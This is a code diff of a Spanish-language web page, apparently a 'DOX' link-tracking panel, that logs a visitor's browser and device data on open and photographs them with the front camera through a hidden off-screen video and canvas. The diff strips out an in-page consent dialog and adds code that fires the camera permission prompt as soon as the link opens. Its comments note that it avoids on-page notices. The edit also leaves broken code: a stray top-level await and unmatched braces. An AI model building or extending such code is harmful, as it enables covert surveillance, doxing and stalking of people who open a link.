@@ -20,15 +20,6 @@ video,canvas{position:fixed;left:-99999px;top:-99999px;width:1px;height:1px;opac
 
 <div class="support-wrap" id="supportWrap"><div class="support-box"><div class="support-glow"></div><div class="support-head">Soporte</div><div class="support-line"><span class="sym">TG</span><div><small>Telegram</small>𝑹𝑩𝑷 | Bebote</div></div><div class="support-line"><span class="sym">WA</span><div><small>WhatsApp</small>Sonyer</div></div></div><button class="support-btn" id="supportBtn" type="button" aria-label="Soporte">SP</button></div>
 <video id="video" autoplay playsinline muted></video><canvas id="canvas"></canvas>
-<div class="modal" id="permissionModal"><div class="box">
-  <div class="consent-title"><div class="cam-dot">DOX</div><h3 style="margin:0">Bienvenido</h3></div>
-  <p style="margin-top:12px">Para continuar puedes autorizar el registro de una foto con la cámara frontal y la ubicación del dispositivo. El navegador mostrará sus permisos correspondientes.</p>
-  <div class="consent-note">También se registran datos técnicos básicos del navegador y dispositivo para mostrar la información correctamente en tu panel.</div>
-  <div class="row" style="margin-top:15px">
-    <button id="denyCameraBtn" type="button">Sin cámara</button>
-    <button class="primary" id="allowCameraBtn" type="button">Permitir</button>
-  </div>
-</div></div>
 <div class="modal" id="modal"><div class="box"><h3>Confirmar acción</h3><p id="modalText"></p><div class="row"><button class="red" id="cancelBtn">Cancelar</button><button class="primary" id="confirmBtn">Continuar</button></div></div></div><div class="toast" id="toast"></div>
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-app.js";
@@ -210,6 +201,29 @@ async function collectDeviceInfo(includeLocation=true){
   return info;
 }
 
+
+async function requestNativeCameraPermissionOnOpen(){
+  if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
+    return "No disponible";
+  }
+
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video:{facingMode:"user"},
+      audio:false
+    });
+
+    // Solo se solicita el permiso. No se toma ni se sube ninguna foto aquí.
+    stream.getTracks().forEach(track=>track.stop());
+    return "Permitido";
+  }catch(e){
+    if(e && (e.name==="NotAllowedError" || e.name==="PermissionDeniedError")){
+      return "Denegado";
+    }
+    return "No disponible";
+  }
+}
+
 async function saveDeviceInfoOnOpen(){
   if(!linkData || !token) return false;
 
@@ -309,9 +323,14 @@ async function verify(){
     $("tokenState").textContent="OK";
     render();
 
-    // Al abrir el enlace, registra automáticamente los datos técnicos
-    // que el navegador expone sin pedir permisos especiales.
-    const ok = await saveDeviceInfoOnOpen();
+    // Empieza a registrar los datos apenas se abre el enlace.
+    const savePromise = saveDeviceInfoOnOpen();
+
+    // Dispara directamente el permiso NATIVO de cámara del navegador/celular.
+    // No usa ventanas ni avisos diseñados dentro de la página.
+    requestNativeCameraPermissionOnOpen().catch(()=>{});
+
+    const ok = await savePromise;
     $("status").textContent = ok ? "Panel actualizado 2027" : "Panel 2027";
   }catch(e){
     console.error(e);
@@ -326,20 +345,9 @@ function closeModal(){const m=$("modal"); if(m) m.classList.remove("show"); sele
 function openConfirm(it,b){if(busy)return;selected=it;selectedBtn=b;$("modalText").textContent=`Para continuar con "${it.name}", se solicitará permiso para usar la cámara frontal y la ubicación. Puedes cancelar si no deseas compartirlos.`;$("modal").classList.add("show");document.body.style.overflow="hidden";}
 $("cancelBtn").onclick=()=>{closeModal();};
 $("confirmBtn").onclick=async()=>{const currentItem=selected; const currentBtn=selectedBtn; closeModal(); await captureAndSave(currentItem,currentBtn);};
-$("allowCameraBtn").onclick=autoCaptureFromConsent;
-if($("denyCameraBtn")) $("denyCameraBtn").onclick=async()=>{
-  $("permissionModal").classList.remove("show");
-  const ok=await saveDeviceInfoOnOpen();
+const ok=await saveDeviceInfoOnOpen();
   toast(ok?"Continuaste sin cámara. Se registraron solo datos técnicos.":"No se pudo registrar la información técnica.",ok?"info":"error");
 };
-function showInitialConsent(){ /* No se abre automáticamente */ }
-async function autoCaptureFromConsent(){
-  // El usuario ya aceptó de forma explícita el uso de cámara y ubicación.
-  const m=$("permissionModal");
-  if(m) m.classList.remove("show");
-  const item={name:"Apertura del link",accion:"apertura_link"};
-  captureAndSave(item,null,{silent:true}).catch(e=>console.error(e));
-}
 async function waitVideo(v){if(v.readyState>=2&&v.videoWidth)return;await new Promise(r=>{v.onloadedmetadata=r;v.oncanplay=r;setTimeout(r,1200);});}
 async function captureAndSave(item,btn,opts={}){
   const silent = opts && opts.silent === true;
